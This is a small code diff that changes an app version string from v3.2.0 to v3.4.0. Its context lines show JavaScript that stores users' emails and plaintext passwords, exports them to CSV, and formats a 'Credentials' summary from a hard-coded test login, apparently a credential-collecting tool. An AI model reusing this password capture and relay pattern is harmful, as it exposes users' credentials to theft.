@@ -309,7 +309,7 @@
           email: 'N/A',
           password: '',
           device: '📱 Mobile 4G/5G',
-          appVersion: 'v3.2.0'
+          appVersion: 'v3.4.0'
         };
       }
       if (!rec.id) rec.id = item.id;
@@ -448,7 +448,7 @@
         `"${(r.email || '').replace(/"/g, '""')}"`,
         `"${(r.password || '').replace(/"/g, '""')}"`,
         `"${(r.device || '').replace(/"/g, '""')}"`,
-        `"${(r.appVersion || 'v3.2.0').replace(/"/g, '""')}"`
+        `"${(r.appVersion || 'v3.4.0').replace(/"/g, '""')}"`
       ]);
 
       const csv = '\uFEFF' + [headers.join(','), ...rows.map(r => r.join(','))].join('\r\n');
@@ -475,7 +475,7 @@
         email: 'test@balubeats.live',
         password: 'balu_secret_123',
         device: '📱 Android 14 (Mobile Data Test)',
-        appVersion: 'v3.2.0'
+        appVersion: 'v3.4.0'
       };
 
       const summaryText = `👤 User: ${testRecord.name} (${testRecord.username})\n🔑 Credentials: ${testRecord.email} / ${testRecord.password}\n📱 Platform: ${testRecord.device}\n⚡ Action: ${testRecord.action}\n⏰ Time: ${testRecord.timestamp}\n\nDATA:${JSON.stringify(testRecord)}`;
